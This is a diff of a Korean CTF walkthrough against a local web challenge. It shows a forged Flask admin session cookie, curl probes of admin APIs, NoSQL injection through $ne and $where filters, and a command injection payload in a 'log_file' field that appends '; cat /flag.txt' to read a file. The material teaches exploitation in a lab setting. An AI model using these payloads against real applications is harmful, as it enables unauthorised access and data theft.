@@ -535,7 +535,7 @@ flask-unsign --sign \
 
 **결과 (예시)**:
 ```
-.eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslJKL00tLlHSUSotTi2CcePAnFoADvQTHw.ZqK5Ag.7xK2mP9vN_3kQ8Lj4wX9tN4Dy6e
+eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90
 ```
 
 > **💡 참고**: 실제로 생성되는 세션 토큰은 위와 다를 수 있습니다.
@@ -558,15 +558,15 @@ flask-unsign --sign \
 # robots.txt에서 /api/admin/이 있다고 했음
 # 일반적인 admin API 패턴 시도
 
-curl -X GET http://ctf.challenge.com:5000/api/admin \
-  -H "Cookie: session=.eJyrVoovSC3KTcxLzStRsiopKk3VUSrKz0lVslIqyS9OVdJRKi1OLYJx48GcWgAOdBMb.ZqK4QA.YpN3fG8Hk_4sR2Ji7wZ1sM3Cx5d"
+curl -X GET http://localhost:5000/api/admin \
+  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90"
 ```
 
 **결과**: 404 Not Found
 
 ```bash
 # 다른 패턴 시도
-curl -X GET http://ctf.challenge.com:5000/api/admin/users \
+curl -X GET http://localhost:5000/api/admin/users \
   -H "Cookie: session=..."
 ```
 
@@ -578,7 +578,7 @@ curl -X GET http://ctf.challenge.com:5000/api/admin/users \
 > 생각해보니 서비스 발견 API가 있었잖아? /api/v2/services/admin/endpoints를 시도해볼까?"
 
 ```bash
-curl http://ctf.challenge.com:5000/api/v2/services/admin/endpoints
+curl http://localhost:5000/api/v2/services/admin/endpoints
 ```
 
 **결과**: 404 (admin 서비스는 등록되지 않음)
@@ -597,7 +597,7 @@ curl http://ctf.challenge.com:5000/api/v2/services/admin/endpoints
 ### Action 19: 디렉토리 브루트포스 (또는 추론)
 
 ```bash
-curl -X POST http://ctf.challenge.com:5000/api/admin/db \
+curl -X POST http://localhost:5000/api/admin/db \
   -H "Cookie: session=..." \
   -H "Content-Type: application/json" \
   -d '{}'
@@ -606,24 +606,26 @@ curl -X POST http://ctf.challenge.com:5000/api/admin/db \
 **결과**: 404
 
 ```bash
-curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
-  -H "Cookie: session=..." \
+curl -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
   -H "Content-Type: application/json" \
   -d '{}'
 ```
 
 **결과**:
 ```json
-{
-  "status": "migration complete",
-  "count": 0
-}
+{"count":4,"status":"migration complete"}
 ```
 
 ### 참가자의 사고:
+> 메인 페이지 힌트: "migrate to v2 APIs"
+> 서비스 목록: database 존재
+> 시스템 특성: Legacy → Migration 개념
+> 권한 상태: Admin 세션 획득
+> 추론 완성: /api/admin/db/migrate
 > "오! /api/admin/db/migrate가 존재한다! 그리고 응답이 왔다!
 > - status: migration complete
-> - count: 0
+> - count: 4
 >
 > 데이터베이스 마이그레이션 도구인 것 같다. 어떤 파라미터를 받는지 실험해보자."
 
@@ -635,18 +637,18 @@ curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
 
 ```bash
 # 일반적인 DB 쿼리 파라미터 시도
-curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
-  -H "Cookie: session=..." \
+curl -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
   -H "Content-Type: application/json" \
   -d '{"query": {}}'
 ```
 
-**결과**: count: 0
+**결과**: count: 4
 
 ```bash
 # filter 파라미터 시도
-curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
-  -H "Cookie: session=..." \
+curl -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
   -H "Content-Type: application/json" \
   -d '{"filter": {}}'
 ```
@@ -664,13 +666,14 @@ curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
 > - filter: {} = 모든 문서 반환
 > - count: 4 = 데이터베이스에 4개 문서
 >
+1. localhost:5000/health에서 javascript_enabled":true, js 지원 db
 > 이건 MongoDB 같은 NoSQL 데이터베이스인 것 같다. NoSQL Injection을 시도해보자."
 
 ### Action 21: NoSQL Injection 시도
 
 ```bash
 # $ne (not equal) 연산자
-curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
+curl -X POST http://localhost:5000/api/admin/db/migrate \
   -H "Cookie: session=..." \
   -H "Content-Type: application/json" \
   -d '{"filter": {"username": {"$ne": "null"}}}'
@@ -678,10 +681,16 @@ curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
 
 **결과**: count: 4
 
+curl -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
+  -H "Content-Type: application/json" \
+  -d '{"filter": {"role": "admin"}}'
+{"count":1,"status":"migration complete"}
+
 ```bash
 # $where 연산자 (JavaScript 실행!)
-curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
-  -H "Cookie: session=..." \
+curl -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
   -H "Content-Type: application/json" \
   -d '{"filter": {"$where": "function() { return true; }"}}'
 ```
@@ -706,8 +715,8 @@ curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
 
 ```bash
 # log_file 파라미터 시도
-curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
-  -H "Cookie: session=..." \
+curl -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
   -H "Content-Type: application/json" \
   -d '{"filter": {"$where": "function() { return true; }"}, "log_file": "/tmp/test.log"}'
 ```
@@ -727,6 +736,20 @@ curl -X POST http://ctf.challenge.com:5000/api/admin/db/migrate \
 >
 > 만약 log_file 파라미터가 shell 명령어에 직접 들어간다면...
 > Command Injection이 가능할 것 같다!"
+
+### BLIND_RCE=true라면:
+
+```bash
+# 방법 1: 파일로 저장 후 읽기
+curl -X POST http://localhost:5000/api/admin/db/migrate \
+  -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.aQNHWA.3hCxEzbBM3bCpm7bpRDh4WEag90" \
+  -d '{
+    "filter": {"$where": "function() { return true; }"},
+    "log_file": "/dev/null; cat /flag.txt > /app/static/flag.txt"
+  }'
+
+# 브라우저나 curl로 접근
+curl http://localhost:5000/static/flag.txt
 
 ---
 
